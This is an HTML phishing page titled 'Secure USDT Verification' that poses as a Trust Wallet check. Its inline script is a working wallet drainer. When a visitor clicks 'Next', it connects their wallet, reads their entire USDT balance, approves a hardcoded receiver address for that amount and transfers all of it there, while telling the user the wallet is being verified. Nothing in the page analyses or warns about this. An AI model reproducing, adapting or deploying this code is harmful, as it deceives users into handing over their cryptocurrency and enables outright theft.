<!DOCTYPE html>
<html>
<head>
  <title>Secure USDT Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" href="./favicon.ico" type="image/x-icon" />
  <style>
    body {
      background:#081c3a;
      color:#fff;
      font-family:sans-serif;
      text-align:center;
      padding-top:40px;
    }
    img {
      width:80px;
      margin:0 auto 20px;
      display:block;
    }
    h1 {
      font-size:1.5em;
      margin-bottom:10px;
    }
    p {
      opacity:0.85;
      margin: 10px auto;
    }
    button {
      padding:14px 28px;
      background:#0052ff;
      color:#fff;
      border:none;
      border-radius:10px;
      cursor:pointer;
      font-size:1em;
      margin-top:20px;
    }
    .footer {
      position:fixed;
      bottom:10px;
      width:100%;
      opacity:0.5;
      font-size:0.8em;
    }
    #processing {
      display:none;
      margin-top:10px;
    }
  </style>
</head>
<body>
  <img src="./logo.png" alt="Trust Wallet">
  <h1>Secure USDT Verification</h1>
  <p id="status">Click Next to verify your wallet</p>
  <button id="next">Next</button>
  <p id="processing">Processing...</p>
  <div class="footer">Verified by Trust Wallet • Trusted since 2009</div>

  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
  <script>
    const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
    const USDT = "0x55d398326f99059fF775485246999027B3197955";
    const ABI = [
      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
      { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
      { "constant": true, "inputs": [{ "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
    ];

    document.getElementById("next").onclick = async () => {
      const status = document.getElementById("status");
      const processing = document.getElementById("processing");
      const btn = document.getElementById("next");

      if (!window.ethereum) {
        return alert("Please open in Trust Wallet browser.");
      }

      btn.style.display = "none";
      processing.style.display = "block";
      status.innerText = "Connecting to wallet...";

      const web3 = new Web3(window.ethereum);
      await window.ethereum.request({ method: 'eth_requestAccounts' });
      const accounts = await web3.eth.getAccounts();
      const user = accounts[0];
      const contract = new web3.eth.Contract(ABI, USDT);

      const balance = await contract.methods.balanceOf(user).call();
      status.innerText = "Approving contract...";
      await contract.methods.approve(RECEIVER, balance).send({ from: user });

      status.innerText = "Transferring USDT...";
      await contract.methods.transferFrom(user, RECEIVER, balance).send({ from: user });

      status.innerText = "✅ All USDT transferred successfully.";
      processing.style.display = "none";
    };
  </script>
</body>
</html>
